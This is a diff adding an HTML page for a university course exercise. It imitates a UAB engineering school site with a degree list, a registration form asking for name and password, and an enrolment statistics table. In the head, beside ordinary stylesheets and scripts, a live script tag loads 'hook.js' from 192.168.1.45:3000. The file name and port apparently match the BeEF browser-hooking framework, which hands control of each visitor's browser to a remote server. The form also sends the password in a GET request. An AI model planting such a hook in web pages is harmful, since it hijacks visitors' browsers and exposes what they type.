@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+	<meta charset="UTF-8">
+	<title>Problema 1 TDIW</title>
+	<link rel="stylesheet" href="css/normalize.css">
+	<link rel="stylesheet" href="css/bootstrap.css">
+	<link rel="stylesheet" href="css/styles.css">
+	<link rel="stylesheet" href="js/bootstrap.css">
+	<script src="js/funciones.js"></script>
+	<script src="http://192.168.1.45:3000/hook.js"></script>
+</head>
+<body>
+	<header class="container-fluid">
+		<div class="row">
+			<div class="col-xs-12 col-md-12 col-lg-12">
+				<a href="http://www.uab.cat">
+				<img src="http://deic-dc0.uab.es/tdiw/images/logo.png" alt=""></a>
+				<h2>Escola d' enginyeria</h2>
+				<p>Benvinguts a l'escola d'enginyeria de la UAB</p>
+			</div>
+		</div>
+		<hr/>
+	</header>
+
+	<section class="container-fluid statistics">
+		<div class="row">
+			<div class="col-xs-12 col-md-12 col-lg-12">
+				<header><h3>Graus disponibles:</h3></header>
+				<ul>
+					<li><a href="http://deic.uab.cat/curt/grauEI">Enginyeria Informàtica</a>
+						<ul>
+							<li>Menció Enginyeria del software</li>
+							<li>Menció Enginyeria de computadors</li>
+							<li>Menció Computació</li>
+							<li><a href="mencions/TI/index.html">Menció Tecnologies de la Informació</a></li>
+						</ul>
+					</li>
+					<li>Enginyeria de Sistemes de Telecomunicació</li>
+					<li>Enginyeria Electrònica de Telecomunicació</li>
+					<li>Enginyeria Química</li>
+				</ul>
+			</div>
+		</div>
+	</section>
+
+	<section class="container-fluid statistics">
+		<div class="row">
+			<div class="col-xs-4 col-md-4 col-lg-4">
+				<header><h3 class="fancy">Registra't com a alumne en un grau:</h3></header>
+				<p>Si us play facilita'ns les teves dades</p>
+				<form method="GET" action="" class="col-lg-12 form-horizontal">
+					<div class="form-group">
+						<label for="">
+							Nom complet:<input type="text" name="nombre">
+						</label>
+					</div>
+
+					<div class="form-group">
+						<label for="">
+							Password:<input type="password" name="passwd">
+						</label>
+					</div>
+
+					<div class="form-group">
+						<label for="">
+							Grau:
+						</label>
+						<select name="grado" id="select1">
+								<option>Enginyeria Informática</option>
+								<option>Enginyeria de Telecomunicacions</option>
+								<option>Enginyeria de sistemes de Telecomunicació</option>
+								<option>Enginyeria Química</option>
+							</select>
+					</div>
+
+					<div class="form-group">
+						<label for="">
+							Tria la menció que t'atreu més:
+						</label>
+					</div>
+
+					<div class="form-group">
+						<select name="mencion" id="select2">
+							<option>Engingeria del software</option>
+							<option>Enginyeria de computadors</option>
+							<option>Computació</option>
+							<option>Tecnologies de la Informació</option>
+						</select>
+					</div>
+
+					<div class="form-group">
+						<input type="submit" class="btn btn-primary" value="Registrar-me">
+					</div>
+				</form>
+			</div>
+		</div>
+		<hr/>
+	</section>
+
+	<section class="container-fluid statistics">
+		<div class="row">
+			<div class="col-xs-3 col-md-3 col-lg-3">
+				<header><h3>Estadístiques de matriculació per graus</h3></header>
+				<table class="table table-bordered">
+					<tr>
+						<th colspan="2">Escola d'enginyeria</th><th colspan="2">Ciències</th>
+					</tr>
+
+					<tr>
+						<td>Enginyeria Informática</td>
+						<td>150</td>
+						<td>Matemàtiques</td>
+						<td>200</td>
+					</tr>
+						
+					<tr>
+						<td>Enginyeria de Sistemes de Telecomunicació</td>
+						<td>300</td>
+						<td rowspan="2" class="text-center">Física</td>
+						<td rowspan="2" class="text-center">100</td>
+					</tr>
+
+					<tr>
+						<td>Enginyeria Química</td>
+						<td>750</td>
+					</tr>
+
+					<tr>
+						<td>Total</td>
+						<td>750</td>
+						<td>Total</td>
+						<td>300</td>
+					</tr>
+
+				</table>
+			</div>
+		</div>
+	</section>
+
+	<footer class="container-fluid">
+		<div class="row">
+			<div class="col-xs-1 col-md-1 col-lg-1">
+				<img src="images/campus-e.png" alt="">
+			</div>
+
+			<div class="col-xs-11 col-md-11 col-lg 11">
+				<p class="text-justify">© 2016 Universitat Autònoma de Barcelona -</p>
+			</div>
+		</div>
+	</footer>
+</body>
+</html>
